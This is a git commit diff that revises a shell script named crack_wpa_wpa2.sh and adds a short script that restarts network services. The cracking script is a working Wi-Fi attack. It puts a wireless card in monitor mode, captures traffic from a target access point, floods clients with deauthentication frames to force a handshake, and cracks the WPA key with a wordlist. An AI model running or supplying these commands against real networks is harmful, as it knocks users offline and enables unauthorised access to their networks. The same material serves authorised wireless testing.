4427a121689feb0da5534496832d5064c890a1aa
aj07mm <aj07mm@hotmail.com>
2016-12-31 22:59:32 -0200

    aoe

--- crack_wpa_wpa2.sh
+++ crack_wpa_wpa2.sh
@@ -1,7 +1,8 @@
 airmon-ng
 airmon-ng start wlan0
 airodump-ng mon0
-airodump-ng -c <CONNECTION_CHANNEL> --bssid <MAC_ADDR> ~/defcon
-aircrack-ng –a2 –b <MAC_ADDR> –w /root/wordlist.txt  ~/defcon*.cap
+airodump-ng -c <CONNECTION_CHANNEL> --bssid <MAC_ADDR> -w ~/defcon mon0
+aireplay-ng -0 0 -a <MAC_ADDR> mon0
+aircrack-ng –b <MAC_ADDR> –w /root/wordlist.txt ~/defcon*.cap
 
 
---
+++ serviceConf.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+service networking start
+service network-manager start
+
+echo --
+echo "networking and network-manager services restarted
